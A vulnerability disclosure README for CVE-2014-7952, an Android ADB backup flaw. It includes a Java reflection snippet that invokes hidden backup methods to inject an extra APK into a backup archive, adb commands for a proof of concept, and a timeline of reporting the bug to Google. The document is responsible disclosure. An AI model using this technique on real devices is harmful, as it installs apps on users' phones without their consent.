# ADB-Backup-APK-Injection
Android ADB backup APK injection vulnerabilty discovered by and POC created by Imre Rad, SEARCH-LAB Ltd., Hungary.

What is ADB backup/restore?
---------------------------
The Android Operating System offers a backup/restore mechanism of installed packages through the ADB utility.
By default, full backup of applications including the private files stored in /data is performed, but this behaviour can be customized by implementing a [BackupAgent](http://developer.android.com/reference/android/app/backup/BackupAgent.html) class. This way applications can feed the backup process with custom files and data.
The backup file created is a simple compressed tar archive with some Android specific headers. Optional encryption is also possible.

APK injection vulnerability
---------------------------
The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned by the applications. While a BackupAgent is being executed during the backup process, it is able to inject additional applications (APKs) into the backup archive without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application (since it is part of the backup archive and the system believes it is authentic).

The Backup Manager can be exploited through simple reflection to inject the arbitrary additional APK:

```
// package name of the application to be injected. This will be one of the arguments of backupToTar() method
String packageName = "com.searchlab.wifitest"; 

Method backupToTar;
Method getData;
try {
	// looking up the internal Classes
	Class<?> fullbackupClass = Class.forName("android.app.backup.FullBackup");
	Class<?> backupDataOutputClass = Class.forName("android.app.backup.BackupDataOutput");
	
	// fetching reference to the backupToTar method and making it accessible for us
	backupToTar = fullbackupClass.getDeclaredMethod("backupToTar", String.class, String.class, String.class, String.class, String.class, backupDataOutputClass);
	backupToTar.setAccessible(true);		
	
	// we also need getData() method
	getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
	getData.setAccessible(true);
	
	// and now let the magic begin!
	Object backupData = getData.invoke(data);
	backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
	backupToTar.invoke(null, packageName, "a", null, getFilesDir().toString(),getFilesDir()+"/com.searchlab.wifitest-1.apk", backupData);
	
	// that's all, folks
	Log.v("MYBACKUP", "backuptotar invoked!");
	
} catch (Exception e) {
	e.printStackTrace();
}
```

Who is affected?
----------------
The vulnerability resides in the backup mechanism of the Android operating system. Anyone using adb for creating restoring backups of their handsets might be affected. One could think that command line applications are used by geeks or programmers only, but not necessarily, there are Windows GUI applications which rely on the same technology behind the scenes when creating backups or restoring them.

Proof of Concept
----------------
In this repository you can find an application along with it's source code which can demonstrate the vulnerabilty.
It was tested on Android 4.4.4 and Android 5.1.1.

Step 1: Install ADB_Backup_Injection.apk (com.searchlab.backupagenttest):

![ADB Backup Injection, custom BackupAgent](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-backupagenttest2.png "ADB Backup Injection, custom BackupAgent")

This application *does not require any permissions*.

Step 2: Use the following command to create a backup of this package
```
adb backup -f backup.ab -apk com.searchlab.backupagenttest
```

Step 3 (optional): If you want to examine the backup archive just created, use the [ABE](https://github.com/nelenkov/android-backup-extractor) tool:
```
java -jar d:\tools\abe\android-backup-extractor-20140630-bin\abe.jar unpack backup.ab backup.tar
```
![ADB Backup Injection, the tar file with the injected content](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-tar-file.png "ADB Backup Injection, the tar file with the injected content")

In the tar file you will find the injected second application (com.searchlab.wifitest).

Step 4: Use the following command to restore the archive:
```
adb restore backup.ab
```

Since the backup.ap file already contains the injected application, it will be restored (installed) as well.

Step 5: Verify that Wifi Test application was indeed installed.
The application runs with android.permission.CHANGE_WIFI_STATE and android.permission.ACCESS_WIFI_STATE permissions to demonstrate that privilege escalation was also possible.

![ADB Backup Injection, injected application](https://raw.githubusercontent.com/irsl/ADB-Backup-APK-Injection/master/android-backup-injection-wifitest.png "ADB Backup Injection, injected application")

CVE
---
The ID CVE-2014-7952 was assigned to this vulnerability.

Affected Versions
-----------------
As of today (2015-07-08), all Android versions are affected, including Android L.

Timeline
--------
SEARCH-LAB Ltd. responsibly reported this threat to the Android security team. At first, Google did not acknowledge the issue being security relevant. Later they kept requesting more time for further investigation, but the bug was still not addressed. The most important milestones of the issue are listed in the next lines:

2014-07-14: The vulnerability was disclosed to the Android security team

2014-07-28: Google refused to treat the issue as a potential threat, but requested to hold off publishing it

2014-10-13: Asked Google for status update and requested a mug for being patient

2014-10-15: Google answered that it did not get fixed in the L release and kept requesting to hold off publishing it. Got a promise about asking around for a mug

(Several more ping-pong emails without any new info, neither a mug)

2015-06-02: Google promised further info in a few days, but it never arrived
